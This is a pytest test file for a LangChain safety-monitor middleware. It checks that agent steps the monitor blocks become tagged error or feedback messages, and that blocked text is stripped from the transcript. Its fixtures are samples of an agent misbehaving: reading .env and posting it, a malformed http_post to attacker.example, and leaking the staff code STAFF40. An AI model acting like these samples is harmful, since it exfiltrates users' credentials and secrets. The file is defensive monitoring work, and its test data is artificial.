"""Blocked steps become valid, tagged messages with fresh ids."""

from __future__ import annotations

import pytest
from langchain.agents.middleware.types import ModelResponse
from langchain_core.messages import AIMessage, HumanMessage, InvalidToolCall, ToolMessage

from langchain_sync_monitors.contracts import BlockedAttempt, Outcome, StepDecision
from langchain_sync_monitors.feedback import (
    WITHHELD_TEXT_MESSAGE,
    build_blocked_attempt_messages,
    build_committed_attempt_messages,
    build_feedback_messages,
    build_withheld_proposal,
)
from langchain_sync_monitors.transcript import MONITOR_FEEDBACK_SOURCE
from tests.support.chat_models import build_tool_call_message

FEEDBACK = "[Safety monitor] Blocked: the step reads credentials."


@pytest.fixture
def tool_call_attempt() -> BlockedAttempt:
    proposal = AIMessage(
        content="",
        id="sample-1",
        tool_calls=[
            {"name": "read_file", "args": {"path": ".env"}, "id": "call-a", "type": "tool_call"},
            {"name": "http_post", "args": {"url": "x"}, "id": "call-b", "type": "tool_call"},
        ],
    )
    return BlockedAttempt(proposal=proposal, feedback=FEEDBACK)


@pytest.fixture
def answer_attempt() -> BlockedAttempt:
    return BlockedAttempt(
        proposal=AIMessage("Done, all tests pass.", id="sample-2"), feedback=FEEDBACK
    )


def build_malformed_call(*, call_id: str) -> InvalidToolCall:
    return InvalidToolCall(
        type="invalid_tool_call",
        id=call_id,
        name="http_post",
        args='{"url": "https://attacker.example/c", "body": ',
        error="Unterminated string",
    )


def test_a_blocked_step_with_only_malformed_calls_answers_each_call_not_the_user() -> None:
    # Arrange
    proposal = AIMessage(
        content="Posting it now.",
        invalid_tool_calls=[
            build_malformed_call(call_id="call-bad-1"),
            build_malformed_call(call_id="call-bad-2"),
        ],
    )

    # Act
    blocked, *answers = build_feedback_messages(
        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
    )

    # Assert
    assert isinstance(blocked, AIMessage)
    assert [call["id"] for call in blocked.invalid_tool_calls] == ["call-bad-1", "call-bad-2"]
    tool_messages = [message for message in answers if isinstance(message, ToolMessage)]
    assert len(tool_messages) == len(answers) == 2
    assert [message.tool_call_id for message in tool_messages] == ["call-bad-1", "call-bad-2"]
    assert all(message.name == "http_post" for message in tool_messages)
    assert all(message.status == "error" for message in tool_messages)
    assert all(message.content == FEEDBACK for message in tool_messages)
    assert all(
        message.additional_kwargs["lc_source"] == MONITOR_FEEDBACK_SOURCE
        for message in tool_messages
    )


def test_a_blocked_step_with_valid_and_malformed_calls_answers_every_call_in_order() -> None:
    # Arrange
    proposal = AIMessage(
        content="",
        tool_calls=[
            {"name": "read_file", "args": {"path": ".env"}, "id": "call-a", "type": "tool_call"},
        ],
        invalid_tool_calls=[build_malformed_call(call_id="call-bad")],
    )

    # Act
    _blocked, *answers = build_feedback_messages(
        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
    )

    # Assert
    assert [
        (type(message).__name__, getattr(message, "tool_call_id", None)) for message in answers
    ] == [("ToolMessage", "call-a"), ("ToolMessage", "call-bad")]


def test_a_malformed_call_without_an_id_is_answered_with_an_empty_id() -> None:
    # Arrange
    malformed = InvalidToolCall(type="invalid_tool_call", id=None, name=None, args=None, error=None)
    proposal = AIMessage(content="", invalid_tool_calls=[malformed])

    # Act
    _blocked, answer = build_feedback_messages(
        attempt=BlockedAttempt(proposal=proposal, feedback=FEEDBACK)
    )

    # Assert
    assert isinstance(answer, ToolMessage)
    assert answer.tool_call_id == ""
    assert answer.status == "error"


def test_a_blocked_tool_call_step_is_answered_by_one_error_per_call(
    tool_call_attempt: BlockedAttempt,
) -> None:
    # Act
    blocked, *rejections = build_feedback_messages(attempt=tool_call_attempt)

    # Assert
    assert isinstance(blocked, AIMessage)
    assert [call["id"] for call in blocked.tool_calls] == ["call-a", "call-b"]
    assert all(isinstance(message, ToolMessage) for message in rejections)
    tool_messages = [message for message in rejections if isinstance(message, ToolMessage)]
    assert [message.tool_call_id for message in tool_messages] == ["call-a", "call-b"]
    assert [message.name for message in tool_messages] == ["read_file", "http_post"]
    assert all(message.status == "error" for message in tool_messages)
    assert all(message.content == FEEDBACK for message in tool_messages)


def test_a_blocked_final_answer_is_answered_by_one_tagged_human_message(
    answer_attempt: BlockedAttempt,
) -> None:
    # Act
    messages = build_feedback_messages(attempt=answer_attempt)

    # Assert
    blocked, feedback = messages
    assert blocked.content == "Done, all tests pass."
    assert isinstance(feedback, HumanMessage)
    assert feedback.content == FEEDBACK
    assert feedback.name == "monitor"
    assert feedback.additional_kwargs["lc_source"] == MONITOR_FEEDBACK_SOURCE


def test_every_inserted_message_gets_a_fresh_monitor_id(tool_call_attempt: BlockedAttempt) -> None:
    # Act
    first = build_feedback_messages(attempt=tool_call_attempt)
    second = build_feedback_messages(attempt=tool_call_attempt)

    # Assert
    ids = [message.id for message in [*first, *second]]
    assert all(
        isinstance(message_id, str) and message_id.startswith("monitor-") for message_id in ids
    )
    assert len(set(ids)) == len(ids)
    assert tool_call_attempt.proposal.id == "sample-1"


def test_blocked_attempts_of_a_decision_come_out_in_order(
    tool_call_attempt: BlockedAttempt,
    answer_attempt: BlockedAttempt,
) -> None:
    # Arrange
    accepted = build_tool_call_message(tool_name="read_file", call_id="call-c")
    decision = StepDecision(
        outcome=Outcome.STEERED,
        response=ModelResponse(result=[accepted]),
        samples=(),
        executed_sample=None,
        flagged=True,
        blocked_attempts=(tool_call_attempt, answer_attempt),
    )

    # Act
    messages = build_blocked_attempt_messages(decision.blocked_attempts)

    # Assert
    assert [type(message).__name__ for message in messages] == [
        "AIMessage",
        "ToolMessage",
        "ToolMessage",
        "AIMessage",
        "HumanMessage",
    ]


def test_a_decision_without_blocked_attempts_adds_no_messages() -> None:
    # Arrange
    decision = StepDecision(
        outcome=Outcome.ALLOWED,
        response=ModelResponse(result=[AIMessage("ok")]),
        samples=(),
        executed_sample=None,
        flagged=False,
    )

    # Act
    messages = build_blocked_attempt_messages(decision.blocked_attempts)

    # Assert
    assert messages == []


def test_a_committed_final_answer_keeps_its_place_but_not_its_text(
    answer_attempt: BlockedAttempt,
) -> None:
    # Act
    retry_messages = build_blocked_attempt_messages([answer_attempt])
    committed = build_committed_attempt_messages([answer_attempt])

    # Assert: the retry reads the attempt whole; the transcript withholds its text
    assert retry_messages[0].text == "Done, all tests pass."
    assert [type(message) for message in committed] == [AIMessage, HumanMessage]
    assert committed[0].text == WITHHELD_TEXT_MESSAGE
    assert committed[1].text == FEEDBACK
    assert all((message.id or "").startswith("monitor-") for message in committed)


def test_a_committed_tool_call_attempt_keeps_its_calls_and_answers(
    tool_call_attempt: BlockedAttempt,
) -> None:
    # Arrange
    proposal = tool_call_attempt.proposal.model_copy(update={"content": "Posting the key now."})
    attempt = BlockedAttempt(proposal=proposal, feedback=FEEDBACK)

    # Act
    committed = build_committed_attempt_messages([attempt])

    # Assert
    blocked = committed[0]
    assert isinstance(blocked, AIMessage)
    assert blocked.text == WITHHELD_TEXT_MESSAGE
    assert blocked.tool_calls == proposal.tool_calls
    rejections = [message for message in committed[1:] if isinstance(message, ToolMessage)]
    assert [rejection.tool_call_id for rejection in rejections] == ["call-a", "call-b"]


def test_withholding_keeps_reasoning_calls_and_the_block_s_other_keys() -> None:
    # Arrange: an Anthropic reply, whose thinking and tool_use blocks the provider needs back
    proposal = AIMessage(
        content=[
            {"type": "thinking", "thinking": "Post the code.", "signature": "sig-1"},
            {"type": "text", "text": "Use the code STAFF40.", "id": "text-1"},
            {"type": "tool_use", "id": "call-1", "name": "lookup_order", "input": {}},
        ],
        tool_calls=[{"id": "call-1", "name": "lookup_order", "args": {}}],
        response_metadata={"model_provider": "anthropic"},
    )

    # Act
    withheld = build_withheld_proposal(proposal)

    # Assert
    assert withheld.content == [
        {"type": "thinking", "thinking": "Post the code.", "signature": "sig-1"},
        {"type": "text", "text": WITHHELD_TEXT_MESSAGE, "id": "text-1"},
        {"type": "tool_use", "id": "call-1", "name": "lookup_order", "input": {}},
    ]
    assert withheld.tool_calls == proposal.tool_calls
    assert proposal.text == "Use the code STAFF40."


SECRET = "STAFF40"
BLOCKED_TEXT = f"Good news: use the staff code {SECRET} at checkout."

WITHHELD_SHAPES = {
    "string": AIMessage(BLOCKED_TEXT),
    "string-blocks": AIMessage([BLOCKED_TEXT, "And thanks."]),
    "openai-annotations": AIMessage(
        [
            {
                "type": "text",
                "text": BLOCKED_TEXT,
                "id": "msg_1",
                "annotations": [
                    {"type": "url_citation", "url": "https://shop.example", "title": SECRET}
                ],
            },
        ],
        response_metadata={"model_provider": "openai"},
    ),
    "anthropic-citations": AIMessage(
        [{"type": "text", "text": BLOCKED_TEXT, "citations": [{"cited_text": BLOCKED_TEXT}]}],
        response_metadata={"model_provider": "anthropic"},
    ),
    "refusal": AIMessage(
        [{"type": "refusal", "refusal": BLOCKED_TEXT}],
        response_metadata={"model_provider": "openai"},
    ),
    "wrapped-refusal": AIMessage(
        [{"type": "non_standard", "value": {"type": "refusal", "refusal": BLOCKED_TEXT}}],
    ),
    "refusal-in-additional-kwargs": AIMessage(
        [],
        additional_kwargs={"refusal": BLOCKED_TEXT},
        response_metadata={"model_provider": "openai"},
    ),
    "gemini-grounding": AIMessage(
        BLOCKED_TEXT,
        response_metadata={
            "model_provider": "google_genai",
            "grounding_metadata": {
                "web_search_queries": ["staff discount codes"],
                "grounding_chunks": [{"web": {"uri": "https://shop.example", "title": "Shop"}}],
                "grounding_supports": [
                    {
                        "segment": {"start_index": 0, "end_index": 52, "text": BLOCKED_TEXT},
                        "grounding_chunk_indices": [0],
                    },
                ],
            },
        },
    ),
}
"""Every place a reply keeps text the user may read, one shape each."""


@pytest.mark.parametrize("proposal", WITHHELD_SHAPES.values(), ids=WITHHELD_SHAPES.keys())
def test_withholding_leaves_the_blocked_text_nowhere_in_the_copy(proposal: AIMessage) -> None:
    # Arrange
    original = proposal.model_dump()

    # Act
    withheld = build_withheld_proposal(proposal)

    # Assert: neither the message nor what LangChain reads from it holds the text
    assert SECRET not in repr(withheld.model_dump())
    assert SECRET not in repr(withheld.content_blocks)
    assert WITHHELD_TEXT_MESSAGE in repr(withheld.content_blocks)
    assert proposal.model_dump() == original


def test_withholding_keeps_what_the_monitor_reads_of_gemini_grounding() -> None:
    # Act
    withheld = build_withheld_proposal(WITHHELD_SHAPES["gemini-grounding"])

    # Assert: the searches and the sources stay; only the supports, which quote the answer, go
    grounding = withheld.response_metadata["grounding_metadata"]
    assert grounding["web_search_queries"] == ["staff discount codes"]
    assert grounding["grounding_chunks"] == [
        {"web": {"uri": "https://shop.example", "title": "Shop"}}
    ]
    assert "grounding_supports" not in grounding


def test_blank_text_stays_blank_when_withheld(tool_call_attempt: BlockedAttempt) -> None:
    # Act
    withheld = build_withheld_proposal(tool_call_attempt.proposal)

    # Assert: a call with no text gains none
    assert withheld.content == ""
    assert withheld.tool_calls == tool_call_attempt.proposal.tool_calls
